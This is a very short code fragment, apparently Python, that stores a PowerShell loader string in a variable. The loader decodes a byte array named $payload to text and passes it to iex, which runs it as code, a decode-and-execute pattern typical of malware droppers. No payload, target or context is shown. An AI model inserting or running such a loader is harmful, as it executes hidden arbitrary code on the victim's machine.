loader="""
[System.Text.Encoding]::ASCII.GetString($payload) | iex
"""